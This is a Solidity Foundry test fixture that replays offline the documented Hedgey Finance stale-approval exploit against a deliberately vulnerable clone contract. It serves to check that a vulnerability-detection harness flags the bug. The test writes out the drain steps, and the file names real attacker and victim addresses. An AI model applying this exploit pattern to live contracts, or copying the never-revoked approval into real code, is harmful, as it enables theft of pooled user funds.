// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    HedgeyClaimCampaignsClone,
    UsdcLikeToken,
    IERC20Min
} from "../fixtures/approve-drainer/b-incident/HedgeyClaimCampaignsClone.sol";

/// @title approve-drainer (b) real-incident fixture: Hedgey Finance (2024-04-19).
/// @notice Minimized OFFLINE replay of the documented attack path (no live RPC): Hedgey's
///         ClaimCampaigns contract granted a standing ERC-20 approval to a campaign-supplied,
///         UNVALIDATED locker address on create, and did NOT revoke that approval on cancel.
///         The attacker supplied their own contract as the locker, cancelled, and then used the
///         residual approval to `transferFrom` the contract's pooled balance. Real on-chain
///         identifiers (attacker, ClaimCampaigns contract, attack tx, amount) are used only for
///         fidelity / labelling - never a detection signal (see PROVENANCE.md). The verdict is
///         derived from the real outcome (the contract balance left to the attacker), not
///         hardcoded; the harness must flag this fixture (label=vuln -> VULNERABLE).
contract HedgeyIncidentTest is Test {
    // Public, documented, on-chain-verified identifiers (Halborn / CertiK / TechFlow /
    // ImmuneBytes / Rekt + Etherscan). ETH attack tx 0x2606d459...1595739, block 19687890,
    // 2024-04-19 07:06:47 UTC; 1,303,910.12 USDC left the ClaimCampaigns contract.
    address constant ATTACKER = 0xDed2b1a426E1b7d415A40Bcad44e98F47181dda2;        // attacker EOA / locker
    address constant CLAIM_CAMPAIGNS = 0xBc452fdC8F851d7c5B72e1Fe74DFB63bb793D511; // exploited Hedgey contract

    // The USDC pulled out of the ClaimCampaigns contract in the pinned ETH tx (6 decimals).
    uint256 constant DRAINED = 1_303_910_120000; // 1,303,910.12e6 USDC

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[approve-drainer] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_hedgeyIncident_isDrained() public {
        UsdcLikeToken usdc = new UsdcLikeToken();
        HedgeyClaimCampaignsClone claims =
            new HedgeyClaimCampaignsClone(IERC20Min(address(usdc)));

        // Honest creator funds a campaign deposit into the shared contract.
        address creator = address(0xC0FFEE);
        usdc.mint(creator, DRAINED);
        vm.startPrank(creator);
        usdc.approve(address(claims), DRAINED);
        // Attacker injects their OWN contract as the unvalidated locker (the missing-validation
        // step). The create grants a standing approval to that locker.
        bytes16 id = bytes16(uint128(0xA11CE));
        claims.createLockedCampaign(id, DRAINED, ATTACKER);
        vm.stopPrank();

        // Cancel returns the campaign's own deposit to the creator but leaves the approval in
        // place (the stale-approval bug). The contract keeps holding funds pooled from OTHER
        // live campaigns - modeled by topping the balance back up.
        vm.prank(creator);
        claims.cancelCampaign(id);
        usdc.mint(address(claims), DRAINED); // other campaigns' pooled balance

        uint256 balanceBefore = usdc.balanceOf(address(claims));

        // Attack tx 0x2606d459...: the residual (never-revoked) approval lets the attacker's
        // contract transferFrom the ClaimCampaigns balance to itself.
        vm.prank(ATTACKER);
        usdc.transferFrom(address(claims), ATTACKER, balanceBefore);

        uint256 finalBalance = usdc.balanceOf(address(claims));
        bool drained = (balanceBefore > 0 && finalBalance == 0);
        _report("hedgey-victim", drained);

        assertTrue(drained, "incident replay should drain the contract via stale approval");
        assertEq(finalBalance, 0, "ClaimCampaigns contract should be emptied");
        assertEq(usdc.balanceOf(ATTACKER), balanceBefore, "attacker should hold the drained balance");
    }
}
